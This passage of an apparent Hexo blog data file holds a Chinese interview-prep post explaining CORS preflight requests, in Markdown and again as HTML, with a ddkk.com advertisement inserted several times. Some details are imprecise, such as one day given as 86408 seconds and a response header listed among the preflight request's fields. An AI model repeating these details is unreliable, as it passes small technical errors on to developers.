Access-Control-Allow-Origin 等头部信息的响应，浏览器才会继续发送实际的跨域请求。\n\n使用预检请求机制可以有效地防范跨域请求带来的安全风险，保护用户数据和隐私。\n","source":"_posts/POST为什么会发送两次请求.md","raw":"---\ntitle: POST为什么会发送两次请求\ndate: 2024-06-16 22:22:31\ntags: HTTP请求\ncategories: 面试\n---\n\n\n#### 本文目录\n\n*   同源策略\n\n*   什么是同源策略\n\n*   CORS\n\n*   简单请求\n\n*   预检请求\n\n*   附带身份凭证的请求与通配符\n\n*   完整的请求流程图\n\n*   总结\n\n\n前言\n--\n\n> 最近博主在**字节面试**中遇到这样一个面试题，这个问题也是前端面试的高频问题，因为在前端开发的日常开发中我们总是会与post请求打交道，一个小小的post请求也是牵扯到很多知识点的，博主在这给大家细细道来。\n\n同源策略\n----\n\n在浏览器中，内容是很开放的，任何资源都可以接入其中，如 JavaScript 文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。\n\n但也不是说浏览器就是完全自由的，如果不加以控制，就会出现一些不可控的局面，例如会出现一些安全问题，如：\n\n*   跨站脚本攻击（XSS）\n\n*   SQL 注入攻击\n\n*   OS 命令注入攻击\n\n*   HTTP 首部注入攻击\n\n*   跨站点请求伪造（CSRF）\n\n*   等等…\n\n\n如果这些都没有限制的话，对于我们用户而言，是相对危险的，因此需要一些安全策略来保障我们的隐私和数据安全。\n\n这就引出了最基础、最核心的安全策略：同源策略。\n\n### 什么是同源策略\n\n同源策略是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n如果两个 URL 的协议、主机和端口都相同，我们就称这两个 URL 同源。\n\n**协议：**协议是定义了数据如何在计算机内和之间进行交换的规则的系统，例如 HTTP、HTTPS。\n\n**主机：**是已连接到一个计算机网络的一台电子计算机或其他设备。网络主机可以向网络上的用户或其他节点提供信息资源、服务和应用。使用 TCP/IP 协议族参与网络的计算机也可称为 IP 主机。\n\n**端口：**主机是计算机到计算机之间的通信，那么端口就是进程到进程之间的通信。\n\n如下表给出了与 URL `http://test.home.com:8080/dir/page.html` 的源进行对比的示例：\n\n| URL | 结果 | 原因 |\n| --- | --- | --- |\n| `http://test.home.com:8080/dir/page.html` | 同源 | 只有路径不同 |\n| `http://test.home.com:8080/dir/inner/another.html` | 同源 | 只有路径不同 |\n| `https://test.home.com:8080/secure.html` | 不同源 | 协议不同，HTTP 和 HTTPS |\n| `http://test.home.com:8081/dir/etc.html` | 不同源 | 端口不同 |\n| `http://online.home.com:8080/dir/other.html` | 不同源 | 主机不同 |\n\n同源策略主要表现在以下三个方面：DOM、Web 数据和网络。\n\n**DOM 访问限制：**同源策略限制了网页脚本（如 JavaScript）访问其他源的 DOM。这意味着通过脚本无法直接访问跨源页面的 DOM 元素、属性或方法。这是为了防止恶意网站从其他网站窃取敏感信息。\n\n**Web 数据限制：**同源策略也限制了从其他源加载的 Web 数据（例如 XMLHttpRequest 或 Fetch API）。在同源策略下，XMLHttpRequest 或 Fetch 请求只能发送到与当前网页具有相同源的目标。这有助于防止跨站点请求伪造（CSRF）等攻击。\n\n**网络通信限制：**同源策略还限制了跨源的网络通信。浏览器会阻止从一个源发出的请求获取来自其他源的响应。这样做是为了确保只有受信任的源能够与服务器进行通信，以避免恶意行为。\n\n出于安全原因，浏览器限制从脚本内发起的跨源 HTTP 请求，XMLHttpRequest 和 Fetch API，只能从加载应用程序的同一个域请求 HTTP 资源，除非使用 CORS 头文件\n\nCORS\n----\n\n对于浏览器限制这个词，要着重解释一下：不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。\n\n浏览器将不同域的内容隔离在不同的进程中，网络进程负责下载资源并将其送到渲染进程中，但由于跨域限制，某些资源可能被阻止加载到渲染进程。如果浏览器发现一个跨域响应包含了敏感数据，它可能会阻止脚本访问这些数据，即使网络进程已经获得了这些数据。CORB 的目标是在渲染之前尽早阻止恶意代码获取跨域数据。\n\n> CORB 是一种安全机制，用于防止跨域请求恶意访问跨域响应的数据。渲染进程会在 CORB 机制的约束下，选择性地将哪些资源送入渲染进程供页面使用。\n\n例如，一个网页可能通过 AJAX 请求从另一个域的服务器获取数据。虽然某些情况下这样的请求可能会成功，但如果浏览器检测到请求返回的数据可能包含恶意代码或与同源策略冲突，浏览器可能会阻止网页访问返回的数据，以确保用户的安全。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n跨源资源共享（Cross-Origin Resource Sharing，CORS）是一种机制，允许在受控的条件下，不同源的网页能够请求和共享资源。由于浏览器的同源策略限制了跨域请求，CORS 提供了一种方式来解决在 Web 应用中进行跨域数据交换的问题。\n\nCORS 的基本思想是，服务器在响应中提供一个标头（HTTP 头），指示哪些源被允许访问资源。浏览器在发起跨域请求时会先发送一个预检请求（OPTIONS 请求）到服务器，服务器通过设置适当的 CORS 标头来指定是否允许跨域请求，并指定允许的请求源、方法、标头等信息。\n\n### 简单请求\n\n不会触发 CORS 预检请求。这样的请求为 `简单请求`，。若请求满足所有下述条件，则该请求可视为 `简单请求`：\n\n**1、** HTTP方法限制：只能使用GET、HEAD、POST这三种HTTP方法之一如果请求使用了其他HTTP方法，就不再被视为简单请求；  \n**2、** 自定义标头限制：请求的HTTP标头只能是以下几种常见的标头：`Accept`、`Accept-Language`、`Content-Language`、`Last-Event-ID`、`Content-Type`（仅限于`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`）HTML头部headerfield字段：DPR、Download、Save-Data、Viewport-Width、WIdth如果请求使用了其他标头，同样不再被视为简单请求；  \n**3、** 请求中没有使用ReadableStream对象；  \n**4、** 不使用自定义请求标头：请求不能包含用户自定义的标头；  \n**5、** 请求中的任意XMLHttpRequestUpload对象均没有注册任何事件监听器；XMLHttpRequestUpload对象可以使用XMLHttpRequest.upload属性访问；\n\n### 预检请求\n\n非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为 `预检请求`。\n\n需预检的请求要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。`预检请求` 的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。\n\n例如我在自己的网站上删除一条记录:\n\n![](./2024/06/16/POST为什么会发送两次请求/1.png)\n它首先会发起一个预检请求,预检请求的头信息包括两个特殊字段：\n\n*   Access-Control-Request-Method：该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 POST。\n\n*   Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 content-type,x-secsdk-csrf-token。\n\n*   access-control-allow-origin：在上述例子中，表示 https://xxx.cn 可以请求数据，也可以设置为\\* 符号，表示统一任意跨源请求。\n\n*   access-control-max-age：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 1 天（86408 秒），即允许缓存该条回应 1 天（86408 秒），在此期间，不用发出另一条预检请求。\n\n\n一旦服务器通过了 `预检请求`，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin 头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin 头信息字段。\n\n![](./2024/06/16/POST为什么会发送两次请求/2.png)\n上面头信息中，Access-Control-Allow-Origin 字段是每次回应都必定包含的。\n\n### 附带身份凭证的请求与通配符\n\n在响应附带身份凭证的请求时：\n\n为了避免恶意网站滥用 Access-Control-Allow-Origin 头部字段来获取用户敏感信息，服务器在设置时不能将其值设为通配符 \\*。相反，应该将其设置为特定的域，例如：Access-Control-Allow-Origin: https://xxx.cn。通过将 Access-Control-Allow-Origin 设置为特定的域，服务器只允许来自指定域的请求进行跨域访问。这样可以限制跨域请求的范围，避免不可信的域获取到用户敏感信息。\n\n\n\n为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Headers 的值设为通配符 \\*。这是因为不受限制的请求头可能被滥用。相反，应该将其设置为一个包含标头名称的列表，例如：Access-Control-Allow-Headers: X-PINGOTHER, Content-Type。通过将 Access-Control-Allow-Headers 设置为明确的标头名称列表，服务器可以限制哪些自定义请求头是允许的。只有在允许的标头列表中的头部字段才能在跨域请求中被接受。\n\n如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。\n\n为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Methods 的值设为通配符 \\*。这样做将允许来自任意域的请求使用任意的 HTTP 方法，可能导致滥用行为的发生。相反，应该将其设置为一个特定的请求方法名称列表，例如：Access-Control-Allow-Methods: POST, GET。通过将 Access-Control-Allow-Methods 设置为明确的请求方法列表，服务器可以限制哪些方法是允许的。只有在允许的方法列表中的方法才能在跨域请求中被接受和处理。\n\n\n\n对于附带身份凭证的请求（通常是 Cookie），\n\n这是因为请求的标头中携带了 Cookie 信息，如果 Access-Control-Allow-Origin 的值为 `*`，请求将会失败。而将 Access-Control-Allow-Origin 的值设置为 `https://xxx.cn`，则请求将成功执行。\n\n另外，响应标头中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。\n\n完整的请求流程图\n--------\n\n![](./2024/06/16/POST为什么会发送两次请求/3.png)\n总结\n--\n\n预检请求是在进行跨域资源共享 `CORS` 时，由浏览器自动发起的一种 OPTIONS 请求。它的存在是为了保障安全，并允许服务器决定是否允许跨域请求。\n\n跨域请求是指在浏览器中向不同域名、不同端口或不同协议的资源发送请求。出于安全原因，浏览器默认禁止跨域请求，只允许同源策略。而当网页需要进行跨域请求时，浏览器会自动发送一个预检请求，以确定是否服务器允许实际的跨域请求。\n\n预检请求中包含了一些额外的头部信息，如 Origin 和 Access-Control-Request-Method 等，用于告知服务器实际请求的方法和来源。服务器收到预检请求后，可以根据这些头部信息，进行验证和授权判断。如果服务器认可该跨域请求，将返回一个包含 Access-Control-Allow-Origin 等头部信息的响应，浏览器才会继续发送实际的跨域请求。\n\n使用预检请求机制可以有效地防范跨域请求带来的安全风险，保护用户数据和隐私。\n","slug":"POST为什么会发送两次请求","published":1,"updated":"2024-06-16T14:27:00.136Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rxz000dbsuh5tcz1v7j","content":"<h4 id=\"本文目录\"><a href=\"#本文目录\" class=\"headerlink\" title=\"本文目录\"></a>本文目录</h4><ul>\n<li><p>同源策略</p>\n</li>\n<li><p>什么是同源策略</p>\n</li>\n<li><p>CORS</p>\n</li>\n<li><p>简单请求</p>\n</li>\n<li><p>预检请求</p>\n</li>\n<li><p>附带身份凭证的请求与通配符</p>\n</li>\n<li><p>完整的请求流程图</p>\n</li>\n<li><p>总结</p>\n</li>\n</ul>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>最近博主在<strong>字节面试</strong>中遇到这样一个面试题，这个问题也是前端面试的高频问题，因为在前端开发的日常开发中我们总是会与post请求打交道，一个小小的post请求也是牵扯到很多知识点的，博主在这给大家细细道来。</p>\n</blockquote>\n<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><p>在浏览器中，内容是很开放的，任何资源都可以接入其中，如 JavaScript 文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。</p>\n<p>但也不是说浏览器就是完全自由的，如果不加以控制，就会出现一些不可控的局面，例如会出现一些安全问题，如：</p>\n<ul>\n<li><p>跨站脚本攻击（XSS）</p>\n</li>\n<li><p>SQL 注入攻击</p>\n</li>\n<li><p>OS 命令注入攻击</p>\n</li>\n<li><p>HTTP 首部注入攻击</p>\n</li>\n<li><p>跨站点请求伪造（CSRF）</p>\n</li>\n<li><p>等等…</p>\n</li>\n</ul>\n<p>如果这些都没有限制的话，对于我们用户而言，是相对危险的，因此需要一些安全策略来保障我们的隐私和数据安全。</p>\n<p>这就引出了最基础、最核心的安全策略：同源策略。</p>\n<h3 id=\"什么是同源策略\"><a href=\"#什么是同源策略\" class=\"headerlink\" title=\"什么是同源策略\"></a>什么是同源策略</h3><p>同源策略是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>如果两个 URL 的协议、主机和端口都相同，我们就称这两个 URL 同源。</p>\n<p><strong>协议：</strong>协议是定义了数据如何在计算机内和之间进行交换的规则的系统，例如 HTTP、HTTPS。</p>\n<p><strong>主机：</strong>是已连接到一个计算机网络的一台电子计算机或其他设备。网络主机可以向网络上的用户或其他节点提供信息资源、服务和应用。使用 TCP&#x2F;IP 协议族参与网络的计算机也可称为 IP 主机。</p>\n<p><strong>端口：</strong>主机是计算机到计算机之间的通信，那么端口就是进程到进程之间的通信。</p>\n<p>如下表给出了与 URL <code>http://test.home.com:8080/dir/page.html</code> 的源进行对比的示例：</p>\n<table>\n<thead>\n<tr>\n<th>URL</th>\n<th>结果</th>\n<th>原因</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>http://test.home.com:8080/dir/page.html</code></td>\n<td>同源</td>\n<td>只有路径不同</td>\n</tr>\n<tr>\n<td><code>http://test.home.com:8080/dir/inner/another.html</code></td>\n<td>同源</td>\n<td>只有路径不同</td>\n</tr>\n<tr>\n<td><code>https://test.home.com:8080/secure.html</code></td>\n<td>不同源</td>\n<td>协议不同，HTTP 和 HTTPS</td>\n</tr>\n<tr>\n<td><code>http://test.home.com:8081/dir/etc.html</code></td>\n<td>不同源</td>\n<td>端口不同</td>\n</tr>\n<tr>\n<td><code>http://online.home.com:8080/dir/other.html</code></td>\n<td>不同源</td>\n<td>主机不同</td>\n</tr>\n</tbody></table>\n<p>同源策略主要表现在以下三个方面：DOM、Web 数据和网络。</p>\n<p><strong>DOM 访问限制：</strong>同源策略限制了网页脚本（如 JavaScript）访问其他源的 DOM。这意味着通过脚本无法直接访问跨源页面的 DOM 元素、属性或方法。这是为了防止恶意网站从其他网站窃取敏感信息。</p>\n<p><strong>Web 数据限制：</strong>同源策略也限制了从其他源加载的 Web 数据（例如 XMLHttpRequest 或 Fetch API）。在同源策略下，XMLHttpRequest 或 Fetch 请求只能发送到与当前网页具有相同源的目标。这有助于防止跨站点请求伪造（CSRF）等攻击。</p>\n<p><strong>网络通信限制：</strong>同源策略还限制了跨源的网络通信。浏览器会阻止从一个源发出的请求获取来自其他源的响应。这样做是为了确保只有受信任的源能够与服务器进行通信，以避免恶意行为。</p>\n<p>出于安全原因，浏览器限制从脚本内发起的跨源 HTTP 请求，XMLHttpRequest 和 Fetch API，只能从加载应用程序的同一个域请求 HTTP 资源，除非使用 CORS 头文件</p>\n<h2 id=\"CORS\"><a href=\"#CORS\" class=\"headerlink\" title=\"CORS\"></a>CORS</h2><p>对于浏览器限制这个词，要着重解释一下：不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。</p>\n<p>浏览器将不同域的内容隔离在不同的进程中，网络进程负责下载资源并将其送到渲染进程中，但由于跨域限制，某些资源可能被阻止加载到渲染进程。如果浏览器发现一个跨域响应包含了敏感数据，它可能会阻止脚本访问这些数据，即使网络进程已经获得了这些数据。CORB 的目标是在渲染之前尽早阻止恶意代码获取跨域数据。</p>\n<blockquote>\n<p>CORB 是一种安全机制，用于防止跨域请求恶意访问跨域响应的数据。渲染进程会在 CORB 机制的约束下，选择性地将哪些资源送入渲染进程供页面使用。</p>\n</blockquote>\n<p>例如，一个网页可能通过 AJAX 请求从另一个域的服务器获取数据。虽然某些情况下这样的请求可能会成功，但如果浏览器检测到请求返回的数据可能包含恶意代码或与同源策略冲突，浏览器可能会阻止网页访问返回的数据，以确保用户的安全。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>跨源资源共享（Cross-Origin Resource Sharing，CORS）是一种机制，允许在受控的条件下，不同源的网页能够请求和共享资源。由于浏览器的同源策略限制了跨域请求，CORS 提供了一种方式来解决在 Web 应用中进行跨域数据交换的问题。</p>\n<p>CORS 的基本思想是，服务器在响应中提供一个标头（HTTP 头），指示哪些源被允许访问资源。浏览器在发起跨域请求时会先发送一个预检请求（OPTIONS 请求）到服务器，服务器通过设置适当的 CORS 标头来指定是否允许跨域请求，并指定允许的请求源、方法、标头等信息。</p>\n<h3 id=\"简单请求\"><a href=\"#简单请求\" class=\"headerlink\" title=\"简单请求\"></a>简单请求</h3><p>不会触发 CORS 预检请求。这样的请求为 <code>简单请求</code>，。若请求满足所有下述条件，则该请求可视为 <code>简单请求</code>：</p>\n<p><strong>1、</strong> HTTP方法限制：只能使用GET、HEAD、POST这三种HTTP方法之一如果请求使用了其他HTTP方法，就不再被视为简单请求；<br><strong>2、</strong> 自定义标头限制：请求的HTTP标头只能是以下几种常见的标头：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Last-Event-ID</code>、<code>Content-Type</code>（仅限于<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>）HTML头部headerfield字段：DPR、Download、Save-Data、Viewport-Width、WIdth如果请求使用了其他标头，同样不再被视为简单请求；<br><strong>3、</strong> 请求中没有使用ReadableStream对象；<br><strong>4、</strong> 不使用自定义请求标头：请求不能包含用户自定义的标头；<br><strong>5、</strong> 请求中的任意XMLHttpRequestUpload对象均没有注册任何事件监听器；XMLHttpRequestUpload对象可以使用XMLHttpRequest.upload属性访问；</p>\n<h3 id=\"预检请求\"><a href=\"#预检请求\" class=\"headerlink\" title=\"预检请求\"></a>预检请求</h3><p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为 <code>预检请求</code>。</p>\n<p>需预检的请求要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。<code>预检请求</code> 的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。</p>\n<p>例如我在自己的网站上删除一条记录:</p>\n<p><img src=\"/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/1.png\"><br>它首先会发起一个预检请求,预检请求的头信息包括两个特殊字段：</p>\n<ul>\n<li><p>Access-Control-Request-Method：该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 POST。</p>\n</li>\n<li><p>Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 content-type,x-secsdk-csrf-token。</p>\n</li>\n<li><p>access-control-allow-origin：在上述例子中，表示 <a href=\"https://xxx.cn/\">https://xxx.cn</a> 可以请求数据，也可以设置为* 符号，表示统一任意跨源请求。</p>\n</li>\n<li><p>access-control-max-age：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 1 天（86408 秒），即允许缓存该条回应 1 天（86408 秒），在此期间，不用发出另一条预检请求。</p>\n</li>\n</ul>\n<p>一旦服务器通过了 <code>预检请求</code>，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin 头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin 头信息字段。</p>\n<p><img src=\"/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/2.png\"><br>上面头信息中，Access-Control-Allow-Origin 字段是每次回应都必定包含的。</p>\n<h3 id=\"附带身份凭证的请求与通配符\"><a href=\"#附带身份凭证的请求与通配符\" class=\"headerlink\" title=\"附带身份凭证的请求与通配符\"></a>附带身份凭证的请求与通配符</h3><p>在响应附带身份凭证的请求时：</p>\n<p>为了避免恶意网站滥用 Access-Control-Allow-Origin 头部字段来获取用户敏感信息，服务器在设置时不能将其值设为通配符 *。相反，应该将其设置为特定的域，例如：Access-Control-Allow-Origin: <a href=\"https://xxx.cn.通过将/\">https://xxx.cn。通过将</a> Access-Control-Allow-Origin 设置为特定的域，服务器只允许来自指定域的请求进行跨域访问。这样可以限制跨域请求的范围，避免不可信的域获取到用户敏感信息。</p>\n<p>为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Headers 的值设为通配符 *。这是因为不受限制的请求头可能被滥用。相反，应该将其设置为一个包含标头名称的列表，例如：Access-Control-Allow-Headers: X-PINGOTHER, Content-Type。通过将 Access-Control-Allow-Headers 设置为明确的标头名称列表，服务器可以限制哪些自定义请求头是允许的。只有在允许的标头列表中的头部字段才能在跨域请求中被接受。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Methods 的值设为通配符 *。这样做将允许来自任意域的请求使用任意的 HTTP 方法，可能导致滥用行为的发生。相反，应该将其设置为一个特定的请求方法名称列表，例如：Access-Control-Allow-Methods: POST, GET。通过将 Access-Control-Allow-Methods 设置为明确的请求方法列表，服务器可以限制哪些方法是允许的。只有在允许的方法列表中的方法才能在跨域请求中被接受和处理。</p>\n<p>对于附带身份凭证的请求（通常是 Cookie），</p>\n<p>这是因为请求的标头中携带了 Cookie 信息，如果 Access-Control-Allow-Origin 的值为 <code>*</code>，请求将会失败。而将 Access-Control-Allow-Origin 的值设置为 <code>https://xxx.cn</code>，则请求将成功执行。</p>\n<p>另外，响应标头中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。</p>\n<h2 id=\"完整的请求流程图\"><a href=\"#完整的请求流程图\" class=\"headerlink\" title=\"完整的请求流程图\"></a>完整的请求流程图</h2><h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><img src=\"/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/3.png\"><br>总结</h2><p>预检请求是在进行跨域资源共享 <code>CORS</code> 时，由浏览器自动发起的一种 OPTIONS 请求。它的存在是为了保障安全，并允许服务器决定是否允许跨域请求。</p>\n<p>跨域请求是指在浏览器中向不同域名、不同端口或不同协议的资源发送请求。出于安全原因，浏览器默认禁止跨域请求，只允许同源策略。而当网页需要进行跨域请求时，浏览器会自动发送一个预检请求，以确定是否服务器允许实际的跨域请求。</p>\n<p>预检请求中包含了一些额外的头部信息，如 Origin 和 Access-Control-Request-Method 等，用于告知服务器实际请求的方法和来源。服务器收到预检请求后，可以根据这些头部信息，进行验证和授权判断。如果服务器认可该跨域请求，将返回一个包含 Access-Control-Allow-Origin 等头部信息的响应，浏览器才会继续发送实际的跨域请求。</p>\n<p>使用预检请求机制可以有效地防范跨域请求带来的安全风险，保护用户数据和隐私。</p>\n","cover":"/img/hubian.png","cover_type":"img","excerpt":"","more":"<h4 id=\"本文目录\"><a href=\"#本文目录\" class=\"headerlink\" title=\"本文目录\"></a>本文目录</h4><ul>\n<li><p>同源策略</p>\n</li>\n<li><p>什么是同源策略</p>\n</li>\n<li><p>CORS</p>\n</li>\n<li><p>简单请求</p>\n</li>\n<li><p>预检请求</p>\n</li>\n<li><p>附带身份凭证的请求与通配符</p>\n</li>\n<li><p>完整的请求流程图</p>\n</li>\n<li><p>总结</p>\n</li>\n</ul>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>最近博主在<strong>字节面试</strong>中遇到这样一个面试题，这个问题也是前端面试的高频问题，因为在前端开发的日常开发中我们总是会与post请求打交道，一个小小的post请求也是牵扯到很多知识点的，博主在这给大家细细道来。</p>\n</blockquote>\n<h2 id=\"同源策略\"><a href=\"#同源策略\" class=\"headerlink\" title=\"同源策略\"></a>同源策略</h2><p>在浏览器中，内容是很开放的，任何资源都可以接入其中，如 JavaScript 文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。</p>\n<p>但也不是说浏览器就是完全自由的，如果不加以控制，就会出现一些不可控的局面，例如会出现一些安全问题，如：</p>\n<ul>\n<li><p>跨站脚本攻击（XSS）</p>\n</li>\n<li><p>SQL 注入攻击</p>\n</li>\n<li><p>OS 命令注入攻击</p>\n</li>\n<li><p>HTTP 首部注入攻击</p>\n</li>\n<li><p>跨站点请求伪造（CSRF）</p>\n</li>\n<li><p>等等…</p>\n</li>\n</ul>\n<p>如果这些都没有限制的话，对于我们用户而言，是相对危险的，因此需要一些安全策略来保障我们的隐私和数据安全。</p>\n<p>这就引出了最基础、最核心的安全策略：同源策略。</p>\n<h3 id=\"什么是同源策略\"><a href=\"#什么是同源策略\" class=\"headerlink\" title=\"什么是同源策略\"></a>什么是同源策略</h3><p>同源策略是一个重要的安全策略，它用于限制一个源的文档或者它加载的脚本如何能与另一个源的资源进行交互。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>如果两个 URL 的协议、主机和端口都相同，我们就称这两个 URL 同源。</p>\n<p><strong>协议：</strong>协议是定义了数据如何在计算机内和之间进行交换的规则的系统，例如 HTTP、HTTPS。</p>\n<p><strong>主机：</strong>是已连接到一个计算机网络的一台电子计算机或其他设备。网络主机可以向网络上的用户或其他节点提供信息资源、服务和应用。使用 TCP&#x2F;IP 协议族参与网络的计算机也可称为 IP 主机。</p>\n<p><strong>端口：</strong>主机是计算机到计算机之间的通信，那么端口就是进程到进程之间的通信。</p>\n<p>如下表给出了与 URL <code>http://test.home.com:8080/dir/page.html</code> 的源进行对比的示例：</p>\n<table>\n<thead>\n<tr>\n<th>URL</th>\n<th>结果</th>\n<th>原因</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>http://test.home.com:8080/dir/page.html</code></td>\n<td>同源</td>\n<td>只有路径不同</td>\n</tr>\n<tr>\n<td><code>http://test.home.com:8080/dir/inner/another.html</code></td>\n<td>同源</td>\n<td>只有路径不同</td>\n</tr>\n<tr>\n<td><code>https://test.home.com:8080/secure.html</code></td>\n<td>不同源</td>\n<td>协议不同，HTTP 和 HTTPS</td>\n</tr>\n<tr>\n<td><code>http://test.home.com:8081/dir/etc.html</code></td>\n<td>不同源</td>\n<td>端口不同</td>\n</tr>\n<tr>\n<td><code>http://online.home.com:8080/dir/other.html</code></td>\n<td>不同源</td>\n<td>主机不同</td>\n</tr>\n</tbody></table>\n<p>同源策略主要表现在以下三个方面：DOM、Web 数据和网络。</p>\n<p><strong>DOM 访问限制：</strong>同源策略限制了网页脚本（如 JavaScript）访问其他源的 DOM。这意味着通过脚本无法直接访问跨源页面的 DOM 元素、属性或方法。这是为了防止恶意网站从其他网站窃取敏感信息。</p>\n<p><strong>Web 数据限制：</strong>同源策略也限制了从其他源加载的 Web 数据（例如 XMLHttpRequest 或 Fetch API）。在同源策略下，XMLHttpRequest 或 Fetch 请求只能发送到与当前网页具有相同源的目标。这有助于防止跨站点请求伪造（CSRF）等攻击。</p>\n<p><strong>网络通信限制：</strong>同源策略还限制了跨源的网络通信。浏览器会阻止从一个源发出的请求获取来自其他源的响应。这样做是为了确保只有受信任的源能够与服务器进行通信，以避免恶意行为。</p>\n<p>出于安全原因，浏览器限制从脚本内发起的跨源 HTTP 请求，XMLHttpRequest 和 Fetch API，只能从加载应用程序的同一个域请求 HTTP 资源，除非使用 CORS 头文件</p>\n<h2 id=\"CORS\"><a href=\"#CORS\" class=\"headerlink\" title=\"CORS\"></a>CORS</h2><p>对于浏览器限制这个词，要着重解释一下：不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。</p>\n<p>浏览器将不同域的内容隔离在不同的进程中，网络进程负责下载资源并将其送到渲染进程中，但由于跨域限制，某些资源可能被阻止加载到渲染进程。如果浏览器发现一个跨域响应包含了敏感数据，它可能会阻止脚本访问这些数据，即使网络进程已经获得了这些数据。CORB 的目标是在渲染之前尽早阻止恶意代码获取跨域数据。</p>\n<blockquote>\n<p>CORB 是一种安全机制，用于防止跨域请求恶意访问跨域响应的数据。渲染进程会在 CORB 机制的约束下，选择性地将哪些资源送入渲染进程供页面使用。</p>\n</blockquote>\n<p>例如，一个网页可能通过 AJAX 请求从另一个域的服务器获取数据。虽然某些情况下这样的请求可能会成功，但如果浏览器检测到请求返回的数据可能包含恶意代码或与同源策略冲突，浏览器可能会阻止网页访问返回的数据，以确保用户的安全。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>跨源资源共享（Cross-Origin Resource Sharing，CORS）是一种机制，允许在受控的条件下，不同源的网页能够请求和共享资源。由于浏览器的同源策略限制了跨域请求，CORS 提供了一种方式来解决在 Web 应用中进行跨域数据交换的问题。</p>\n<p>CORS 的基本思想是，服务器在响应中提供一个标头（HTTP 